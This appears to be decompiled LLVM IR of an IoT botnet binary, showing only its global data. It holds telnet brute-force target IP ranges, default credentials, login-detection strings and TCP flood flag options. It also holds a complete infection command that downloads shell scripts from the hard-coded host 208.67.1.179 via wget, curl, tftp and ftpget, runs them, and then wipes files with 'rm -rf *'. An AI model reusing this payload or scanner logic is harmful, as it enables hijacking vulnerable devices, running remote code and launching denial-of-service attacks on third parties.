source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805c00c.2 = global i32 0
@global_var_805c024.3 = local_unnamed_addr global i32* @global_var_805c00c.2
@global_var_805b564.4 = constant i32 0
@global_var_805c504.5 = global i32 0
@global_var_805c010.6 = local_unnamed_addr global i32 0
@global_var_805c540.7 = global i32 0
@global_var_805c544.8 = local_unnamed_addr global i32 0
@global_var_805c548.9 = local_unnamed_addr global i32 0
@global_var_805c270.10 = local_unnamed_addr global i32 4095
@global_var_805c26c.11 = local_unnamed_addr global i32 362436
@global_var_80584fb.12 = constant [7 x i8] c"(null)\00"
@global_var_8058502.14 = constant [3 x i8] c"-c\00"
@global_var_80581bb.15 = constant [3 x i8] c"sh\00"
@global_var_8058505.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8058520.17 = constant i32 -1
@global_var_8058920.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805892e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805c520.20 = local_unnamed_addr global i32 0
@global_var_8058937.21 = constant [5 x i8] c"PING\00"
@global_var_80584ef.22 = constant [8 x i8] c"busybox\00"
@global_var_80584f7.23 = constant i32 2293796
@global_var_80584f9.24 = constant i32 1848115235
@global_var_805c220.25 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80584ef.22, i32 0, i32 0), i8* bitcast (i32* @global_var_80584f7.23 to i8*), i8* bitcast (i32* @global_var_80584f9.24 to i8*)]
@global_var_80584c3.26 = constant [7 x i8] c"nvalid\00"
@global_var_80584ca.27 = constant [6 x i8] c"ailed\00"
@global_var_80584d0.28 = constant [9 x i8] c"ncorrect\00"
@global_var_80584d9.29 = constant [6 x i8] c"enied\00"
@global_var_80584df.30 = constant [5 x i8] c"rror\00"
@global_var_80584e4.31 = constant [7 x i8] c"oodbye\00"
@global_var_80584eb.32 = constant [4 x i8] c"bad\00"
@global_var_805c200.33 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80584c3.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80584ca.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80584d0.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80584d9.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80584df.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80584e4.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80584eb.32, i32 0, i32 0)]
@global_var_805c528.34 = local_unnamed_addr global i32 0
@global_var_805c52c.35 = local_unnamed_addr global i32 0
@global_var_80627b4.36 = local_unnamed_addr global i32 0
@global_var_805893c.37 = constant [6 x i8] c":>%$#\00"
@global_var_805c537.38 = local_unnamed_addr global i32 0
@global_var_805c538.39 = local_unnamed_addr global i32 0
@global_var_8058943.42 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_805894f.43 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_805895d.44 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_8058968.45 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8058975.46 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_8058980.47 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_805898d.48 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_8058999.49 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_80589a6.50 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_80589b3.51 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_80589c0.52 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_80589ce.53 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_80589d9.54 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_80589e6.55 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_80589f3.56 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_8058a00.57 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_8058a0d.58 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_8058a1a.59 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8058a27.60 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_8058a34.61 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_8058a3f.62 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_8058a4b.63 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_8058a58.64 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_8058a63.65 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_8058a6e.66 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_8058a7a.67 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_8058a86.68 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_8058a92.69 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_8058a9f.70 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_8058aac.71 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8058ab8.72 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8058ac5.73 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_8058ad1.74 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_8058adc.75 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8058ae8.76 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8058af4.77 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_8058b00.78 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_8058b0c.79 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8058b18.80 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8058b25.81 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8058b32.82 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_8058b3f.83 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_8058b4c.84 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8058b59.85 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8058b66.86 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_8058b73.87 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_8058b80.88 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_8058b8d.89 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_8058b9a.90 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_8058ba7.91 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_8058bb5.92 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8058bc2.93 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_8058bd0.94 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_8058bdd.95 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8058beb.96 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_8058bf9.97 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8058c06.98 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_8058c13.99 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_8058c20.100 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_8058c2d.101 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_8058c3a.102 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_8058c47.103 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_8058c54.104 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_8058c61.105 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_8058c6e.106 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_8058c7b.107 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_8058c88.108 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8058c95.109 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_8058ca2.110 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_8058caf.111 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_8058cbc.112 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_8058cc9.113 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_8058cd6.114 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_8058ce3.115 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_8058cf0.116 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_8058cfd.117 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_8058d0a.118 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_8058d17.119 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_8058d24.120 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_8058d31.121 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_8058d3e.122 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_8058d4b.123 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_8058d58.124 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_8058d65.125 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_8058d72.126 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_8058d7f.127 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_8058d8c.128 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8058d99.129 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_8058da6.130 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8058db3.131 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_8058dc0.132 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_8058dcd.133 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8058dda.134 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8058de7.135 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_8058df4.136 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8058e01.137 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_8058e0e.138 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_8058e1b.139 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8058e28.140 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_8058e34.141 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8058e41.142 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_8058e4e.143 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8058e5b.144 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8058e67.145 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8058e74.146 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_8058e82.147 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_8058e90.148 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_8058e9d.149 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8058eab.150 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8058eb9.151 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_8058ec6.152 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8058ed4.153 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_8058ee1.154 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_8058eee.155 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_8058efc.156 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_8058f0a.157 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8058f18.158 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_8058f26.159 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_8058f33.160 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_8058f3f.161 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_8058f4d.162 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_8058f5b.163 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_8058f69.164 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_8058f77.165 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_8058f85.166 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_8058f93.167 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_8058fa1.168 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_8058faf.169 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_8058fbd.170 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_8058fcb.171 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_8058fd9.172 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_8058fe7.173 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8058ff4.174 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8059001.175 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_805900e.176 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_805901b.177 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8059028.178 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_8059035.179 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_8059043.180 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_8059051.181 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_805905f.182 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_805906c.183 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_8059079.184 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_8059087.185 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_8059095.186 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_80590a3.187 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_80590b0.188 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_80590bd.189 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_80590ca.190 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_80590d7.191 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_80590e4.192 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_80590f0.193 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_80590fe.194 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_805910b.195 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_8059119.196 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_8059127.197 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_8059135.198 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_8059142.199 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_8059150.200 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_805915e.201 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_805916c.202 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_805917a.203 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8059188.204 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8059196.205 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_80591a3.206 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_80591b1.207 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_80591bf.208 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_80591cd.209 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_80591da.210 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_80591e7.211 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_80591f4.212 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_8059201.213 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_805920e.214 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_805921b.215 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_8059228.216 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_8059236.217 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_8059244.218 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_8059252.219 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_8059260.220 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_805926e.221 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_805927c.222 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8059289.223 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_8059296.224 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_80592a4.225 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_80592b2.226 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_80592c0.227 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_80592ce.228 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_80592dc.229 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_80592ea.230 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_80592f8.231 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_8059306.232 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_8059313.233 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_8059320.234 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_805932d.235 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_805933a.236 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_8059347.237 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_8059354.238 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_8059362.239 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_80627a8.240 = local_unnamed_addr global i32 0
@global_var_805845e.241 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805846d.242 = constant [6 x i8] c"/tmp/\00"
@global_var_8058473.243 = constant [6 x i8] c"/var/\00"
@global_var_8058479.244 = constant [6 x i8] c"/dev/\00"
@global_var_805847f.245 = constant [10 x i8] c"/var/run/\00"
@global_var_8058489.246 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8058493.247 = constant [6 x i8] c"/mnt/\00"
@global_var_8058499.248 = constant [7 x i8] c"/boot/\00"
@global_var_80584a0.249 = constant [6 x i8] c"/usr/\00"
@global_var_80584a6.250 = constant [6 x i8] c"/opt/\00"
@global_var_805c1c0.251 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805845e.241, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805846d.242, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058473.243, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058479.244, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805847f.245, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058489.246, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058493.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058499.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80584a0.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80584a6.250, i32 0, i32 0)]
@global_var_805c1ec = external global i32
@global_var_805936f.256 = constant [3 x i8] c"\0D\0A\00"
@global_var_805c240.257 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80584c3.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80584ca.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80584d0.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80584d9.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80584df.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80584e4.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80584eb.32, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80584ef.22, i32 0, i32 0), i8* bitcast (i32* @global_var_80584f7.23 to i8*), i8* bitcast (i32* @global_var_80584f9.24 to i8*)]
@global_var_8059372.258 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_8059389.259 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_805938e.260 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_80582a0.261 = constant [430 x i8] c" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_805844e.262 = constant [5 x i8] c"root\00"
@global_var_8058454.263 = constant [7 x i8] c"telnet\00"
@global_var_805845c.264 = constant i32 1680801792
@global_var_805c1a0.265 = local_unnamed_addr global [7 x i8*] [i8* getelementptr inbounds ([430 x i8], [430 x i8]* @global_var_80582a0.261, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805844e.262, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805844e.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058454.263, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805844e.262, i32 0, i32 0), i8* bitcast (i32* @global_var_805845c.264 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058454.263, i32 0, i32 0)]
@global_var_80593b8.266 = constant [6 x i8] c"arfgG\00"
@global_var_80593be.267 = constant [9 x i8] c"HBiug655\00"
@global_var_80593c7.268 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_80593d4.269 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_80593e8.270 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_80593f9.271 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8059405.272 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8059411.273 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805941d.274 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8059427.275 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8059432.276 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8059440.277 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805944c.278 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8059459.279 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8059462.280 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8059472.281 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805947d.282 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8059489.283 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8059495.284 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_80594a3.285 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_80594b1.286 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_80594bf.287 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_80594c9.288 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_80594d7.289 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_80594e5.290 = constant [12 x i8] c"yteytietyue\00"
@global_var_80594f1.291 = constant [9 x i8] c"qsortEQS\00"
@global_var_80594fa.292 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805950a.293 = constant [4 x i8] c"std\00"
@global_var_805950e.294 = constant [4 x i8] c"dts\00"
@global_var_8059512.295 = constant [4 x i8] c"lsk\00"
@global_var_8059516.296 = constant [4 x i8] c"kek\00"
@global_var_805951a.297 = constant [6 x i8] c"smack\00"
@global_var_8059520.298 = constant [4 x i8] c"ily\00"
@global_var_8059524.299 = constant [4 x i8] c"tyf\00"
@global_var_8059528.300 = constant [4 x i8] c"pos\00"
@global_var_805952c.301 = constant [6 x i8] c"cunts\00"
@global_var_8059540.302 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80593b8.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80593be.267, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80593c7.268, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_80593d4.269, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80593e8.270, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80593f9.271, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059405.272, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059411.273, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805941d.274, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059427.275, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059432.276, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059440.277, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805944c.278, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059459.279, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8059462.280, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059472.281, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805947d.282, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059489.283, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059495.284, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80594a3.285, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80594b1.286, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80594bf.287, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80594c9.288, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80594d7.289, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80594e5.290, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80594f1.291, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80594fa.292, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805950a.293, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805950e.294, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059512.295, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059516.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805951a.297, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059520.298, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059524.299, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059528.300, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805952c.301, i32 0, i32 0)]
@global_var_80595d0.303 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_80595ec.304 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805960d.305 = constant [4 x i8] c"all\00"
@global_var_8059611.306 = constant i32 2037579820
@global_var_8059613.307 = constant [4 x i8] c"syn\00"
@global_var_8059617.308 = constant [4 x i8] c"rst\00"
@global_var_805961b.309 = constant [4 x i8] c"fin\00"
@global_var_805961f.310 = constant [4 x i8] c"ack\00"
@global_var_8059623.311 = constant [4 x i8] c"psh\00"
@global_var_8059627.312 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_80580c0.313 = constant [5 x i8] c"mips\00"
@global_var_80580c5.314 = constant [7 x i8] c"mipsel\00"
@global_var_80580cc.315 = constant [4 x i8] c"sh4\00"
@global_var_80580d0.316 = constant [4 x i8] c"x86\00"
@global_var_80580d4.317 = constant [5 x i8] c"i686\00"
@global_var_80580d9.318 = constant [4 x i8] c"ppc\00"
